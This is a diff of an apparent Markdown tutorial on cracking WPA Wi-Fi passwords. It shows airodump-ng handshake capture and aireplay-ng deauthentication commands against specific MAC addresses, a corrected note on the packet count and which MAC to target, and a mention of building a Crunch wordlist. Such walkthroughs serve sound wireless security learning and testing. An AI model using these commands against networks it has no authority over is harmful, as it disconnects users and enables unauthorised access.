@@ -86,7 +86,8 @@ airodump-ng --bssid 30:DE:4B:AD:CC:8A --channel 161 --write wpa_handshake wlan0
 ```bash
 aireplay-ng --deauth 4 -a 30:DE:4B:AD:CC:8A -c EE:7B:BE:70:D6:1F wlan0
 ```
-> The first MAC is the target and the second MAC is the USB wifi adapter
+> The number after the --deauth is the number of packets you want to send to the target.
+> The first MAC is the target and the second MAC of the client you want to disconnect (will be under station).
 
 4. The handshake WPA will be saved in the file we created wpa_handshake.cap
 5. We will create a wordlist of passwords possibilities using the tool **Crunch**. Then read the file
